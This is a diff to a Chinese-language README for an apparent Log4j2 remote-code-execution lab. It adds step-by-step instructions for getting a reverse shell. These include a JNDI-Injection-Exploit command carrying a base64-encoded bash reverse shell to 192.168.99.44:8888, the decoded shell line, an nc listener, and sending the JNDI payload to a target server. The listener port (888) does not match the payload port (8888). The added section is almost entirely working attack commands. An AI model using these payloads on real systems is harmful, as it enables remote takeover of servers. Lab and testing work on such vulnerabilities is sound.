@@ -19,3 +19,14 @@ Apache log4j2 开源日志组件远程代码执行
 
 ## 环境下载
 [log4j2_rce-0.0.1.jar](https://github.com/dbgee/log4j2_rce/releases/tag/0.0.1) 
+
+## 反弹shell 指引
+1. 下载命令执行工具，也可以编译Exploit.java 将计算器换成Linux反弹代码，这里为了方便直接使用 [JNDI-Injection-Exploit-1.0.jar](./shell/JNDI-Injection-Exploit-1.0.jar)
+2. 开启利用工具 `java -jar JNDI-Injection-Exploit-1.0.jar -C "bash -c {echo,YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguOTkuNDQvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A  "192.168.99.44"`
+    1. 命令说明：-C  指定要执行的命令，-A 指定监听端口所在IP（一般为本机IP）
+    2. base64 编码部分为Linux 反弹shell  `bash -i > /dev/tcp/192.168.99.44/8888 0>&1`
+    3. 将利用工具生成的jndi links 放入postman payload 中
+3. 本地开启nc 监听 `nc -Lvvp 888`
+4. 发送payload 到目标服务器，反弹shell 成功
+5. 利用过程截图: ![利用结果](./shell/shell.png)、![服务器端输出](./shell/output.png)
+
